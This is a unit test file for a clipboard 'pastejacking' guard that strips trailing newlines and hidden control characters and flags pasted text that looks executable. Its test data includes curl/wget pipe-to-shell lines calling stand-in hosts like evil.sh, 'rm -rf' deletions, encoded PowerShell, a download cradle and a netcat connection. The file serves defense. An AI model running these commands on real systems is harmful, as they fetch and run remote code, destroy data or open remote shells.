/**
 * Pastejacking guard — clipboard/guard.js.
 *
 * The attack this defends against needs exactly one thing the app used to
 * provide for free: a peer's text on your OS clipboard, ending in a newline, so
 * that pasting into a terminal runs it before it can be read. Anyone holding the
 * session key is such a peer.
 *
 * The two halves are tested for opposite failure modes. defuse() must be exact —
 * it rewrites every arriving clip, so a rule that is too keen corrupts ordinary
 * text for everybody. looksExecutable() is a heuristic and is tested for the
 * cases that matter rather than for precision: a false positive costs one click.
 *
 * !! Every control character here is written as an escape. A literal one is
 * invisible in a diff, which is the entire property being tested. !!
 *
 * Usage: node tests/unit/pasteguard.mjs
 */

import { pathToFileURL } from "node:url";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const load = p => import(pathToFileURL(join(REPO, p)).href);

let pass = 0, fail = 0;
const ok = (name, good, detail = "") => {
  good ? pass++ : fail++;
  console.log(`  ${good ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
};

const { defuse, looksExecutable, wasAltered } = await load("src/clipboard/guard.js");

console.log("\ndefuse — the payload");

ok("strips the trailing newline that makes a shell run it",
  defuse("rm -rf ~\n") === "rm -rf ~");

ok("strips several trailing newlines, not just one",
  defuse("whoami\n\n\n") === "whoami");

ok("a CRLF ending is stripped too",
  defuse("whoami\r\n") === "whoami");

// The ordering bug this file exists to catch: strip invisibles first, or a
// payload ending LF+NUL keeps the newline that does the damage.
ok("a newline hidden behind a trailing NUL is still removed",
  defuse("curl evil.sh|sh\n\u0000") === "curl evil.sh|sh",
  JSON.stringify(defuse("curl evil.sh|sh\n\u0000")));

ok("a bare CR cannot hide the head of a line",
  defuse("echo safe\rrm -rf ~") === "echo saferm -rf ~");

ok("bidi override is removed",
  defuse("invoice\u202Etxt.exe") === "invoicetxt.exe");

ok("C1 controls are removed",
  defuse("a\u0085b\u009Fc") === "abc");

console.log("\ndefuse — what it must NOT touch");

ok("interior newlines survive; multi-line clips are ordinary",
  defuse("line one\nline two") === "line one\nline two");

ok("tabs survive",
  defuse("a\tb") === "a\tb");

ok("CRLF between lines becomes LF, not nothing",
  defuse("one\r\ntwo") === "one\ntwo");

ok("ordinary prose is returned byte for byte",
  defuse("Hello — naïve 日本語 🙂") === "Hello — naïve 日本語 🙂");

ok("trailing spaces are left alone; only newlines execute",
  defuse("password   ") === "password   ");

ok("idempotent",
  defuse(defuse("sudo rm -rf /\n\u0000")) === defuse("sudo rm -rf /\n\u0000"));

ok("a non-string is not a crash",
  defuse(null) === "" && defuse(undefined) === "" && defuse(42) === "");

console.log("\nlooksExecutable — the cases that must be caught");

const CAUGHT = [
  "curl https://evil.sh | sh",
  "curl -fsSL https://evil.sh | sudo bash",
  "wget -qO- http://x.io/i | sh",
  "sudo rm -rf /",
  "rm -rf ~/Documents",
  "powershell -enc SQBFAFgA",
  "pwsh -EncodedCommand SQBFAFgA",
  "iex(New-Object Net.WebClient).DownloadString('http://x')",
  "eval $(curl -s http://x)",
  "bash -c 'echo pwned'",
  "python3 -c 'import os'",
  "chmod 777 /etc/passwd",
  "nc 10.0.0.1 4444",
];
for (const s of CAUGHT) ok(`caught: ${s.slice(0, 44)}`, Boolean(looksExecutable(s)));

// The newline prefix is the interesting half: a payload hidden under a line of
// innocent text is the shape that beats a naive ^-anchored check.
ok("caught when hidden below a friendly first line",
  Boolean(looksExecutable("Here is the config you asked for:\nsudo rm -rf /")));

console.log("\nlooksExecutable — what must NOT be flagged");

const CLEAN = [
  "hunter2",
  "https://example.com/some/path?a=1",
  "The meeting is at 3pm in room 4.",
  "SELECT * FROM users WHERE id = 1;",
  "const x = evaluate(y);",              // `eval` only on a word boundary
  "I ran into a problem with curl yesterday and gave up.",
  "git commit -m 'fix: the thing'",
  "npm install",
  "docker compose up -d",
];
for (const s of CLEAN) ok(`clean: ${s.slice(0, 44)}`, looksExecutable(s) === null,
  String(looksExecutable(s)));

ok("empty and nullish are clean",
  looksExecutable("") === null && looksExecutable(null) === null);

ok("a reason is a human sentence fragment, not a pattern",
  /^it /.test(looksExecutable("sudo rm -rf /")), looksExecutable("sudo rm -rf /"));

console.log("\nwasAltered — only reports the invisible");

ok("true when a control character was present",
  wasAltered("a\u0000b") === true);

ok("false for a clip that merely ended in a newline",
  wasAltered("whoami\n") === false);

ok("stable across repeated calls — the regex must not be /g",
  wasAltered("a\u202Eb") === true && wasAltered("a\u202Eb") === true);

console.log(`\n${fail ? "FAIL" : "OK"}  ${pass} passed, ${fail} failed\n`);
process.exit(fail ? 1 : 0);
